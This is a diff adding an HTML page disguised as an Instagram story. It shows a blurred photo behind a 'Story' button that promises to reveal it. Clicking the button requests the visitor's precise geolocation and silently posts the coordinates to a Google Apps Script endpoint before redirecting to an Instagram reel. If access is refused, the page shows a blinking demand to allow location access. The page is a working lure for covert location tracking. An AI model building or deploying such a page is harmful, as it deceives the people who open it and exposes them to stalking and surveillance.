@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Instagram Story</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #87ceeb 10%, #20b2aa 60%);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .title {
+      font-family: 'Comic Sans MS', cursive, sans-serif;
+      font-size: 24px;
+      color: black;
+      margin-bottom: 10px;
+    }
+
+    .popup {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 20px;
+      text-align: center;
+      width: 90%;
+      max-width: 280px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      border: 1px solid #e0e0e0;
+    }
+
+    .popup img {
+      width: 100%;
+      height: auto;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      filter: blur(5px);
+      transition: filter 0.5s ease;
+    }
+
+    .btn {
+      appearance: none;
+      border: 1px solid #ccc;
+      background: #f9f9f9;
+      color: #333;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: .2s;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .btn:hover {
+      background: #e9e9e9;
+    }
+
+    #loading-text {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    #error-text {
+      display: none;
+      margin-top: 5px;
+      font-size: 14px;
+      color: #d9534f;
+      animation: blink 2.3s infinite;
+      white-space: nowrap;
+    }
+
+    @keyframes blink {
+      0%, 50%, 100% { opacity: 1; }
+      25%, 75% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="title"></div>
+  <div class="popup">
+    <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7szBPidUJcBI5dbJW2Kuigspcubq2KoZ7_9W1ZC5Td-XitXeCm9PiTdzyA_Wbt_RjGXBRBAp3xYky42CxO8C-Dvm6ESf4I4KSAJ0OliwfJxQK5niBarqlU6Es04S_YAWVxeAwbWs2IDnMX1_GXrtzvsVbSJ1bYu0n8o9wLQJIzB-dhiWCK0V-E_K3sBuP/s1056/khushi.png" alt="User Photo">
+
+    <button class="btn" id="main-button" onclick="sendLocation()">Story</button>
+    <div id="loading-text">Loading...</div>
+    <div id="error-text">Permission denied, please allow location access.</div>
+  </div>
+
+  <script>
+    const BACKEND_URL = "https://script.google.com/macros/s/AKfycbyXQpXYJDMPTC9F9zf7fWzwlo0sBcQYpkh-dSYuKeGGUvA9H2WaPGkBxzgCE-PyVYGn/exec";
+    const REDIRECT_URL = "https://www.instagram.com/reel/DMNWqyuyCOW/?igsh=MWdpYWlsYWU2ejV3Ng==";
+
+    function postLocation(payload) {
+      fetch(BACKEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error("Error:", err));
+    }
+
+    function sendLocation() {
+      document.getElementById("loading-text").style.display = "block";
+      document.getElementById("main-button").style.display = "none";
+      document.getElementById("error-text").style.display = "none";
+
+      if (!("geolocation" in navigator)) {
+        document.getElementById("error-text").innerText = "Your browser does not support location.";
+        document.getElementById("error-text").style.display = "block";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition((pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const user = "Secret-User";
+        postLocation({ latitude: lat, longitude: lon, user });
+
+        document.getElementById("user-photo").style.filter = "blur(0px)";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1000);
+
+      }, (err) => {
+        document.getElementById("user-photo").style.filter = "blur(5px)";
+        document.getElementById("loading-text").style.display = "none";
+        document.getElementById("main-button").style.display = "block";
+        document.getElementById("error-text").style.display = "block";
+      }, {
+        enableHighAccuracy: true,
+        timeout: 12000,
+        maximumAge: 0
+      });
+    }
+  </script>
+</body>
+</html>
